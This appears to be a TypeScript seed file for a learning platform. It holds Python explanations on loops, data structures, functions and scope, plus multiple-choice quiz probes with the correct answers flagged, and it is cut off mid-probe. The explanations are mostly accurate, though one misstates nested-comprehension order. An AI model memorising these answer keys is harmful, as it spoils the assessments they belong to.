    conceptId: LOOPS, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'Loops repeat a block of code. Python has two loop types: ' +
      '`for item in iterable:` — iterates over each element of a sequence (list, range, string, tuple). ' +
      '`for i in range(5):` gives i = 0, 1, 2, 3, 4. `range(start, stop, step)` is flexible. ' +
      '`while condition:` — repeats as long as the condition is True; if the condition never becomes False, the loop runs forever (infinite loop). ' +
      'Loop control: `break` exits the loop immediately; `continue` skips to the next iteration. ' +
      'for-else / while-else: the else clause runs only if the loop completed normally (no break). ' +
      'Use for when you know the number of iterations or are iterating over a collection; use while for indefinite repetition (user input, retry logic).',
    targetedMisconceptions: [],
    source: LOOPS_SRC,
  },
  {
    conceptId: LOOPS, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      '`range(n)` produces 0 to n-1, NOT 0 to n. `range(5)` = 0,1,2,3,4 — five items starting at 0. ' +
      'A common off-by-one error: `for i in range(len(lst)):` iterates indices 0 to len-1, but `lst[len(lst)]` is IndexError. ' +
      'Modifying a list while iterating over it with for produces unpredictable results — iterate over a copy or use a while loop with careful index management. ' +
      'An infinite while loop usually means the loop variable is never updated inside the loop body: ' +
      '`while x < 10:` where x never increases inside will run forever.',
    targetedMisconceptions: [`${LOOPS}:M1`],
    source: LOOPS_SRC,
  },
]
const LOOPS_PROBES: SeedProbe[] = [
  {
    conceptId: LOOPS, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'How many times does the loop body execute?\n\nfor i in range(3, 8, 2):\n    print(i)',
    choices: [
      { text: '3 — i takes values 3, 5, 7 (start=3, stop=8 exclusive, step=2)', isCorrect: true },
      { text: '5 — range(3, 8, 2) produces 5 values from 3 to 8', isCorrect: false, misconceptionId: `${LOOPS}:M1` },
      { text: '2 — the step of 2 halves the count of a range(3,8) which would be 5', isCorrect: false },
    ],
    correctValue: '3 iterations: i = 3, 5, 7',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${LOOPS}:M1`],
    source: LOOPS_SRC,
  },
  {
    conceptId: LOOPS, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'x = 1; while x < 5: print(x). What happens?',
    choices: [
      { text: 'Infinite loop — x is never updated inside the loop body; the condition x < 5 is always True', isCorrect: true },
      { text: 'Prints 1, 2, 3, 4 — while loops automatically increment the loop variable by 1 each iteration', isCorrect: false, misconceptionId: `${LOOPS}:M2` },
    ],
    correctValue: 'Infinite loop — x never changes; while does NOT auto-increment',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${LOOPS}:M2`],
    source: LOOPS_SRC,
  },
]

// ─── cs.control.nested-control-patterns ──────────────────────────────────────
const NESTED = 'cs.control.nested-control-patterns'
const NESTED_SRC = 'docs/computer-science/kg/graph.json — cs.control.nested-control-patterns'
const NESTED_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: NESTED, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Nested control structures are loops or conditionals inside other loops or conditionals. ' +
      'Nested loops are common for 2D structures (matrices, grid searches): outer loop iterates rows, inner loop iterates columns. ' +
      'Key insight: the inner loop completes all its iterations for EACH iteration of the outer loop. ' +
      'A break inside a nested loop breaks only the INNERMOST loop, not all outer loops. ' +
      'To break multiple levels, use a flag variable or extract the inner structure into a function (then `return` exits the whole function). ' +
      'Common patterns: search all pairs (double loop over i, j), accumulate results (sum_row[i] += grid[i][j]), build output row by row. ' +
      'Deep nesting (3+ levels) is a design smell — refactor by extracting inner loops into named functions.',
    targetedMisconceptions: [],
    source: NESTED_SRC,
  },
  {
    conceptId: NESTED, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'break in a nested loop breaks ONLY the loop it directly belongs to — not all enclosing loops. ' +
      '```\nfor i in range(3):\n    for j in range(3):\n        if j == 1: break\n    print(i)\n```\n' +
      'The break exits the inner j-loop but the outer i-loop continues, printing 0, 1, 2. ' +
      'Students expecting the break to exit "the loop" in general are surprised. ' +
      'Also: indentation errors in nested structures move code into the wrong level — a `print` that should be inside the inner loop ends up outside it if indented one level too few.',
    targetedMisconceptions: [`${NESTED}:M1`],
    source: NESTED_SRC,
  },
]
const NESTED_PROBES: SeedProbe[] = [
  {
    conceptId: NESTED, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'How many total times does `count += 1` execute?\n\ncount = 0\nfor i in range(4):\n    for j in range(3):\n        count += 1',
    choices: [
      { text: '12 — the outer loop runs 4 times; for each, the inner runs 3 times; 4 × 3 = 12', isCorrect: true },
      { text: '7 — 4 outer iterations + 3 inner iterations', isCorrect: false, misconceptionId: `${NESTED}:M2` },
      { text: '3 — only the inner loop increments count; the outer loop just controls which pass of the inner loop runs', isCorrect: false },
    ],
    correctValue: '12 — nested loops multiply: 4 × 3',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${NESTED}:M2`],
    source: NESTED_SRC,
  },
  {
    conceptId: NESTED, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'In a double loop, a `break` inside the inner loop fires. Does it exit both loops or just the inner one?',
    choices: [
      { text: 'Just the inner loop — break exits the loop it is directly inside; the outer loop continues its next iteration', isCorrect: true },
      { text: 'Both loops — break terminates all enclosing loops until the function returns', isCorrect: false, misconceptionId: `${NESTED}:M1` },
    ],
    correctValue: 'break exits only the innermost loop',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${NESTED}:M1`],
    source: NESTED_SRC,
  },
]

// ─── cs.data.strings ──────────────────────────────────────────────────────────
const CSSTRS = 'cs.data.strings'
const CSSTRS_SRC = 'docs/computer-science/kg/graph.json — cs.data.strings'
const CSSTRS_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: CSSTRS, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'A string is an immutable sequence of characters. ' +
      'Strings are indexed from 0: `s = "hello"`; `s[0] = "h"`, `s[-1] = "o"` (negative index counts from the end). ' +
      'Slicing: `s[1:4]` → "ell" (from index 1 up to but not including 4). ' +
      'Concatenation: `"hello" + " world"` = "hello world". ' +
      'Key string methods: `.upper()`, `.lower()`, `.strip()` (remove leading/trailing whitespace), ' +
      '`.split(sep)` (split into list), `sep.join(list)` (join list into string), ' +
      '`.replace(old, new)`, `.find(sub)` (returns index or -1), `.startswith(prefix)`, `len(s)`. ' +
      'Strings are immutable — methods return NEW strings; they never modify the original. ' +
      'f-strings: `f"My name is {name}"` — the cleanest formatting for most cases.',
    targetedMisconceptions: [],
    source: CSSTRS_SRC,
  },
  {
    conceptId: CSSTRS, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'Strings are immutable in Python — you cannot change a character in place. ' +
      '`s = "hello"; s[0] = "H"` raises TypeError. ' +
      'To "modify" a string, build a new one: `s = "H" + s[1:]`. ' +
      'Methods like `.upper()` do NOT change s — they return a new string. ' +
      '`s.upper()` without reassigning does nothing useful: `s = s.upper()` is needed to keep the result. ' +
      'This surprises students coming from C where strings are char arrays that can be modified in place.',
    targetedMisconceptions: [`${CSSTRS}:M1`],
    source: CSSTRS_SRC,
  },
]
const CSSTRS_PROBES: SeedProbe[] = [
  {
    conceptId: CSSTRS, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 's = "python". What is `s[2:5]`?',
    choices: [
      { text: '"tho" — slicing from index 2 (inclusive) to 5 (exclusive): p(0)y(1)t(2)h(3)o(4)n(5)', isCorrect: true },
      { text: '"yth" — slicing from index 2 to 5 inclusive', isCorrect: false, misconceptionId: `${CSSTRS}:M1` },
      { text: '"pyt" — slicing takes the first 5 characters then removes the first 2', isCorrect: false },
    ],
    correctValue: '"tho" — s[2] to s[4] (stop index excluded)',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${CSSTRS}:M1`],
    source: CSSTRS_SRC,
  },
  {
    conceptId: CSSTRS, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'After `s = "hello"; s.upper()`, what is the value of s?',
    choices: [
      { text: '"hello" — .upper() returns a new string; s is unchanged; you need `s = s.upper()` to update it', isCorrect: true },
      { text: '"HELLO" — .upper() modifies the string in place', isCorrect: false, misconceptionId: `${CSSTRS}:M1` },
    ],
    correctValue: '"hello" — strings are immutable; methods return new strings',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${CSSTRS}:M1`],
    source: CSSTRS_SRC,
  },
]

// ─── cs.data.lists ────────────────────────────────────────────────────────────
const CSLISTS = 'cs.data.lists'
const CSLISTS_SRC = 'docs/computer-science/kg/graph.json — cs.data.lists'
const CSLISTS_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: CSLISTS, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'A list is a mutable, ordered sequence of values of any type. ' +
      'Creation: `lst = [1, "a", 3.0]`. Indexing: `lst[0]` = 1; `lst[-1]` = 3.0. Slicing: `lst[1:3]` = ["a", 3.0]. ' +
      'Mutation: `lst[0] = 99` changes the first element in place. ' +
      'Key methods: `.append(x)` adds x to the end; `.insert(i, x)` inserts at index i; ' +
      '`.pop(i)` removes and returns element at i (default last); `.remove(x)` removes first occurrence of x; ' +
      '`.sort()` sorts in place; `sorted(lst)` returns a new sorted list. ' +
      '`len(lst)` returns the count. `x in lst` tests membership in O(n). ' +
      'Lists can be nested: `matrix = [[1,2],[3,4]]`; `matrix[1][0]` = 3.',
    targetedMisconceptions: [],
    source: CSLISTS_SRC,
  },
  {
    conceptId: CSLISTS, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'Lists are mutable and assignment copies the reference, not the list. ' +
      '`a = [1,2,3]; b = a; b.append(4)` — now a = [1,2,3,4] too, because a and b point to the SAME list. ' +
      'To get an independent copy: `b = a.copy()` or `b = a[:]`. ' +
      'This surprises students because integers work differently: `x = 5; y = x; y = 6` leaves x = 5 (integers are immutable; y was rebound to a new int, not a shared reference). ' +
      'Lists passed to functions are also passed by reference — the function can modify the original list.',
    targetedMisconceptions: [`${CSLISTS}:M1`],
    source: CSLISTS_SRC,
  },
]
const CSLISTS_PROBES: SeedProbe[] = [
  {
    conceptId: CSLISTS, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'a = [1,2,3]; b = a; b.append(4). What is the value of a?',
    choices: [
      { text: '[1,2,3,4] — b is a reference to the same list; appending to b modifies the list that a also points to', isCorrect: true },
      { text: '[1,2,3] — b = a copies the list; a is unaffected by changes to b', isCorrect: false, misconceptionId: `${CSLISTS}:M1` },
      { text: '[1,2,3,4,4] — appending to a reference appends twice (once to b, once propagated back to a)', isCorrect: false },
    ],
    correctValue: '[1,2,3,4] — a and b are aliases for the same list object',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${CSLISTS}:M1`],
    source: CSLISTS_SRC,
  },
  {
    conceptId: CSLISTS, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'How do you create an independent copy of a list `a` so that modifying the copy does not change `a`?',
    choices: [
      { text: '`b = a.copy()` or `b = a[:]` — both create a shallow copy; modifying b\'s top-level elements does not affect a', isCorrect: true },
      { text: '`b = a` — this creates a copy that is independent of a', isCorrect: false, misconceptionId: `${CSLISTS}:M1` },
    ],
    correctValue: 'a.copy() or a[:] for a shallow copy; `b = a` is just another reference',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${CSLISTS}:M1`],
    source: CSLISTS_SRC,
  },
]

// ─── cs.data.tuples ───────────────────────────────────────────────────────────
const TUPLES = 'cs.data.tuples'
const TUPLES_SRC = 'docs/computer-science/kg/graph.json — cs.data.tuples'
const TUPLES_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: TUPLES, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'A tuple is an immutable, ordered sequence — like a list that cannot be changed after creation. ' +
      'Syntax: `t = (1, "hello", 3.0)` or `t = 1, "hello", 3.0` (parentheses optional). ' +
      'Indexing and slicing work identically to lists. ' +
      'Use tuples for: fixed data that should not be modified (coordinates, RGB colours, database records), ' +
      'function return values (return x, y returns a tuple), ' +
      'dictionary keys (lists cannot be keys; tuples can because they are hashable). ' +
      'Tuple unpacking: `x, y = (3, 4)` assigns 3 to x and 4 to y — convenient for multi-value assignment. ' +
      'Single-element tuple requires a trailing comma: `(5,)` — `(5)` is just the integer 5 in parentheses.',
    targetedMisconceptions: [],
    source: TUPLES_SRC,
  },
  {
    conceptId: TUPLES, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'A single-element tuple REQUIRES a trailing comma: `t = (5,)`. Without it, `t = (5)` is just the integer 5 in parentheses — not a tuple at all. ' +
      '`type((5)) = int`; `type((5,)) = tuple`. ' +
      'This matters when you build tuples programmatically and expect them to have a specific length. ' +
      'Also: tuples are immutable at the top level, but mutable objects inside them (like lists) can still be changed: ' +
      '`t = ([1,2], 3); t[0].append(99)` works and changes the list inside t.',
    targetedMisconceptions: [`${TUPLES}:M1`],
    source: TUPLES_SRC,
  },
]
const TUPLES_PROBES: SeedProbe[] = [
  {
    conceptId: TUPLES, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'What is the type of `(7)`?',
    choices: [
      { text: 'int — parentheses here are grouping notation, not a tuple; a single-element tuple requires `(7,)`', isCorrect: true },
      { text: 'tuple — any value inside parentheses is a tuple in Python', isCorrect: false, misconceptionId: `${TUPLES}:M1` },
      { text: 'float — Python defaults to float for any single-value container', isCorrect: false },
    ],
    correctValue: 'int — use (7,) for a single-element tuple',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${TUPLES}:M1`],
    source: TUPLES_SRC,
  },
  {
    conceptId: TUPLES, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'Why can a tuple be used as a dictionary key, but a list cannot?',
    choices: [
      { text: 'Tuples are immutable (hashable), so their hash value is fixed; lists are mutable and their hash could change — Python requires hashable (immutable) keys', isCorrect: true },
      { text: 'Dictionary keys must be shorter than 255 characters; lists are too long for keys in most cases', isCorrect: false, misconceptionId: `${TUPLES}:M2` },
    ],
    correctValue: 'Tuples are immutable → hashable → valid as dict keys; lists are mutable → unhashable',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${TUPLES}:M2`],
    source: TUPLES_SRC,
  },
]

// ─── cs.data.dictionaries ─────────────────────────────────────────────────────
const DICTS = 'cs.data.dictionaries'
const DICTS_SRC = 'docs/computer-science/kg/graph.json — cs.data.dictionaries'
const DICTS_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: DICTS, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'A dictionary (dict) is a mutable, unordered (Python 3.7+ insertion-ordered) collection of key-value pairs. ' +
      'Creation: `d = {"name": "Alice", "age": 30}`. ' +
      'Access: `d["name"]` → "Alice"; `d.get("age", 0)` → 30 (0 if missing — avoids KeyError). ' +
      'Mutation: `d["age"] = 31` updates; `d["city"] = "London"` adds a new key. ' +
      'Deletion: `del d["city"]`; `d.pop("city")` removes and returns. ' +
      'Iteration: `d.keys()`, `d.values()`, `d.items()` (key-value tuples). ' +
      'Membership test: `"name" in d` checks for the key (not value) — O(1) average. ' +
      'Keys must be hashable (strings, numbers, tuples); values can be anything.',
    targetedMisconceptions: [],
    source: DICTS_SRC,
  },
  {
    conceptId: DICTS, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      '`d["missing_key"]` raises KeyError — dictionaries do not return None for absent keys. ' +
      'Use `d.get("key")` for a None-safe lookup, or `d.get("key", default)` for a custom default. ' +
      'Also: `"value" in d` checks KEYS, not values. ' +
      'To check if a value is in the dict: `"value" in d.values()` — but this is O(n), not O(1). ' +
      'Iterating `for k in d:` iterates over KEYS, not values — `d[k]` inside the loop gives the value.',
    targetedMisconceptions: [`${DICTS}:M1`],
    source: DICTS_SRC,
  },
]
const DICTS_PROBES: SeedProbe[] = [
  {
    conceptId: DICTS, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'd = {"x": 10, "y": 20}. What does `"x" in d` return?',
    choices: [
      { text: 'True — `in` checks dictionary KEYS; "x" is a key', isCorrect: true },
      { text: 'False — `in` checks dictionary VALUES; "x" is not a value', isCorrect: false, misconceptionId: `${DICTS}:M1` },
      { text: '10 — `in` returns the value associated with the key', isCorrect: false },
    ],
    correctValue: 'True — `in` tests for key membership in O(1)',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${DICTS}:M1`],
    source: DICTS_SRC,
  },
  {
    conceptId: DICTS, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'd = {"a": 1}. What happens with `d["b"]`?',
    choices: [
      { text: 'KeyError — accessing a missing key raises an exception; use d.get("b") for a safe lookup', isCorrect: true },
      { text: 'Returns None — Python dictionaries return None for any missing key', isCorrect: false, misconceptionId: `${DICTS}:M1` },
    ],
    correctValue: 'KeyError — missing keys raise an exception; d.get() avoids this',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${DICTS}:M1`],
    source: DICTS_SRC,
  },
]

// ─── cs.data.sets ─────────────────────────────────────────────────────────────
const CSSETS = 'cs.data.sets'
const CSSETS_SRC = 'docs/computer-science/kg/graph.json — cs.data.sets'
const CSSETS_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: CSSETS, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'A set is an unordered collection of UNIQUE, HASHABLE elements. ' +
      'Creation: `s = {1, 2, 3}` or `s = set([1, 2, 2, 3])` → {1, 2, 3} (duplicates removed). ' +
      'Empty set: `set()` (not `{}` — that creates an empty dict). ' +
      'Key operations: `.add(x)`, `.remove(x)` (KeyError if missing), `.discard(x)` (no error if missing). ' +
      'Set algebra: `A | B` (union), `A & B` (intersection), `A - B` (difference), `A ^ B` (symmetric difference). ' +
      'Membership: `x in s` is O(1) — the main reason to prefer sets over lists for large containment tests. ' +
      'Sets are unordered — you cannot index a set; convert to a sorted list if order matters.',
    targetedMisconceptions: [],
    source: CSSETS_SRC,
  },
  {
    conceptId: CSSETS, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      '`{}` creates an empty DICT, not an empty set. `set()` is needed for an empty set. ' +
      'This is a frequent Python gotcha: `d = {}; type(d)` = dict; `s = set(); type(s)` = set. ' +
      'Sets are unordered — the iteration order is not guaranteed and not the insertion order. ' +
      'Two sets {1,2,3} and {3,1,2} are identical — there is no concept of "first element" in a set. ' +
      'A set can only contain hashable elements — you cannot put a list into a set (use frozenset for a hashable set-within-a-set).',
    targetedMisconceptions: [`${CSSETS}:M1`],
    source: CSSETS_SRC,
  },
]
const CSSETS_PROBES: SeedProbe[] = [
  {
    conceptId: CSSETS, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 's = set([1, 2, 2, 3, 3, 3]). What is len(s)?',
    choices: [
      { text: '3 — sets store only unique elements; duplicates are removed', isCorrect: true },
      { text: '6 — set() counts all elements including duplicates', isCorrect: false, misconceptionId: `${CSSETS}:M2` },
      { text: 'Error — sets cannot be created from lists containing duplicates', isCorrect: false },
    ],
    correctValue: '3 — {1, 2, 3} after deduplication',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${CSSETS}:M2`],
    source: CSSETS_SRC,
  },
  {
    conceptId: CSSETS, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'What is the type of `{}`?',
    choices: [
      { text: 'dict — `{}` creates an empty dictionary; use `set()` to create an empty set', isCorrect: true },
      { text: 'set — curly braces always create a set in Python', isCorrect: false, misconceptionId: `${CSSETS}:M1` },
    ],
    correctValue: 'dict — `{}` is an empty dict; `set()` is an empty set',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${CSSETS}:M1`],
    source: CSSETS_SRC,
  },
]

// ─── cs.data.comprehensions-iterators ────────────────────────────────────────
const COMPITER = 'cs.data.comprehensions-iterators'
const COMPITER_SRC = 'docs/computer-science/kg/graph.json — cs.data.comprehensions-iterators'
const COMPITER_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: COMPITER, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'List comprehensions provide a concise syntax for building lists by transforming or filtering an iterable: ' +
      '`[expr for item in iterable if condition]`. ' +
      '`squares = [x**2 for x in range(10)]` — clearer and often faster than a loop + append. ' +
      'Dict comprehensions: `{k: v for k, v in pairs}`. Set comprehensions: `{x for x in lst}`. ' +
      'Generator expressions: `(x**2 for x in range(10))` — like a list comprehension but lazy (yields one value at a time), O(1) memory instead of O(n). ' +
      'An iterator is any object implementing `__next__()`; iterables implement `__iter__()` (return an iterator). ' +
      '`iter(lst)` returns an iterator; `next(it)` gets the next element; StopIteration when exhausted. ' +
      'for-loops work by calling `iter()` then repeatedly calling `next()` until StopIteration.',
    targetedMisconceptions: [],
    source: COMPITER_SRC,
  },
  {
    conceptId: COMPITER, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Generator expressions and list comprehensions are syntactically similar but produce different objects. ' +
      '`[x**2 for x in range(1000000)]` builds a list of 1M values in memory. ' +
      '`(x**2 for x in range(1000000))` builds a generator that computes each value on demand — O(1) memory. ' +
      'If you iterate the generator once, you can\'t restart it: a generator is one-way and one-time. ' +
      'Also: nested comprehensions execute the rightmost for-clause first (like nested loops): ' +
      '`[f(x,y) for x in A for y in B]` is the same as `for x in A: for y in B: result.append(f(x,y))`.',
    targetedMisconceptions: [`${COMPITER}:M1`],
    source: COMPITER_SRC,
  },
]
const COMPITER_PROBES: SeedProbe[] = [
  {
    conceptId: COMPITER, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What does `[x*2 for x in range(5) if x % 2 == 0]` produce?',
    choices: [
      { text: '[0, 4, 8] — x takes values 0,1,2,3,4; the filter keeps 0,2,4; doubling gives 0,4,8', isCorrect: true },
      { text: '[0, 2, 4, 6, 8] — if condition filters nothing; all doubled values are included', isCorrect: false, misconceptionId: `${COMPITER}:M2` },
      { text: '[2, 4] — even numbers from range(5) with no doubling', isCorrect: false },
    ],
    correctValue: '[0, 4, 8] — filter evens (0,2,4) then double',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${COMPITER}:M2`],
    source: COMPITER_SRC,
  },
  {
    conceptId: COMPITER, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You iterate a generator expression and print all values. You then iterate it again. What happens on the second pass?',
    choices: [
      { text: 'Nothing is printed — generators are one-time iterators; once exhausted, they do not reset', isCorrect: true },
      { text: 'The same values print again — generators reset to the start after being fully consumed', isCorrect: false, misconceptionId: `${COMPITER}:M1` },
    ],
    correctValue: 'Generators are exhausted after one pass; create a new one to re-iterate',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${COMPITER}:M1`],
    source: COMPITER_SRC,
  },
]

// ─── cs.func.functions ────────────────────────────────────────────────────────
const FUNCS = 'cs.func.functions'
const FUNCS_SRC = 'docs/computer-science/kg/graph.json — cs.func.functions'
const FUNCS_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: FUNCS, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'A function is a named, reusable block of code that takes parameters, executes, and optionally returns a value. ' +
      'Definition: `def function_name(param1, param2=default):`. ' +
      'Arguments can be positional or keyword: `f(3, 4)` or `f(x=3, y=4)`. ' +
      'Default parameters: `def greet(name, greeting="Hello")` — `greeting` is optional in the call. ' +
      'Return: `return value` exits the function and passes value to the caller. A function with no return statement returns None. ' +
      'Functions are first-class objects in Python — they can be assigned to variables, passed as arguments, and returned from other functions. ' +
      'Why use functions? Avoid repetition (DRY — Don\'t Repeat Yourself), name a concept, isolate and test a unit of logic, hide implementation details (abstraction).',
    targetedMisconceptions: [],
    source: FUNCS_SRC,
  },
  {
    conceptId: FUNCS, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Calling a function and defining a function are different. ' +
      '`def square(x): return x**2` defines it — no code runs yet. ' +
      '`square(4)` calls it — code runs and returns 16. ' +
      'Forgetting `return` is a common bug: a function that computes a result but forgets to return it gives None to the caller silently. ' +
      'Parameters are LOCAL copies — modifying a parameter inside a function does not change the variable in the caller (for immutable types). ' +
      'But mutable objects (lists, dicts) passed as arguments ARE modified in place — the parameter and caller share the same object.',
    targetedMisconceptions: [`${FUNCS}:M1`],
    source: FUNCS_SRC,
  },
]
const FUNCS_PROBES: SeedProbe[] = [
  {
    conceptId: FUNCS, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'def add(a, b): a + b. What does add(3, 4) return?',
    choices: [
      { text: 'None — there is no `return` statement; Python functions without return implicitly return None', isCorrect: true },
      { text: '7 — the expression a + b is computed and returned as the function\'s last expression', isCorrect: false, misconceptionId: `${FUNCS}:M1` },
      { text: 'Error — functions must have a return statement to be valid', isCorrect: false },
    ],
    correctValue: 'None — missing return statement; `return a + b` is needed',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${FUNCS}:M1`],
    source: FUNCS_SRC,
  },
  {
    conceptId: FUNCS, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'def f(x): x = x + 1. After calling f(5), what is the value of x in the calling scope?',
    choices: [
      { text: 'Unchanged — x inside f is a local parameter; reassigning it does not affect any variable named x in the caller', isCorrect: true },
      { text: '6 — modifying x inside the function updates the caller\'s variable because Python passes by reference', isCorrect: false, misconceptionId: `${FUNCS}:M2` },
    ],
    correctValue: 'Unchanged — parameters are local; integer reassignment does not propagate back',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${FUNCS}:M2`],
    source: FUNCS_SRC,
  },
]

// ─── cs.func.scope-namespaces ─────────────────────────────────────────────────
const SCOPE = 'cs.func.scope-namespaces'
const SCOPE_SRC = 'docs/computer-science/kg/graph.json — cs.func.scope-namespaces'
const SCOPE_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: SCOPE, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Scope determines which variables are visible at a given point in a program. ' +
      'Python uses LEGB scope resolution: Local → Enclosing → Global → Built-in. ' +
      'Local: variables defined inside the current function. ' +
      'Enclosing: variables from the outer function in nested functions. ' +
      'Global: variables at the module (top) level. ' +
      'Built-in: Python\'s built-in names (print, len, range). ' +
      'A variable is looked up in this order — the first match wins. ' +
      'To assign to a global variable inside a function: declare `global x` first. ' +
      'To assign to an enclosing variable: declare `nonlocal x`. ' +
      'Without these declarations, assigning x inside a function creates a NEW local x, shadowing the outer one.',
    targetedMisconceptions: [],
    source: SCOPE_SRC,
  },
  {
    conceptId: SCOPE, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'You can READ a global variable from inside a function without `global`, but you cannot ASSIGN to it. ' +
      '```\nx = 10\ndef f(): print(x)  # reads global x — works\ndef g(): x = 20  # creates local x, global x unchanged\ndef h(): global x; x = 20  # modifies global x\n```\n' +
      'Attempting to read a global x AND assign to x in the same function (without `global`) causes UnboundLocalError: ' +
      'Python sees the assignment and marks x as local for the whole function; the read-before-assign fails.',
    targetedMisconceptions: [`${SCOPE}:M1`],
    source: SCOPE_SRC,
  },
]
const SCOPE_PROBES: SeedProbe[] = [
  {
    conceptId: SCOPE, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'x = 5. def f(): x = 10; print(x). f(); print(x). What is printed?',
    choices: [
      { text: '10 then 5 — f creates a local x = 10; the global x is unchanged at 5', isCorrect: true },
      { text: '10 then 10 — assigning inside f modifies the global x', isCorrect: false, misconceptionId: `${SCOPE}:M1` },
      { text: '5 then 5 — f reads the global x and printing it inside f shows 5', isCorrect: false },
    ],
    correctValue: '10 (local x) then 5 (global x unchanged)',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${SCOPE}:M1`],
    source: SCOPE_SRC,
  },
  {
    conceptId: SCOPE, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
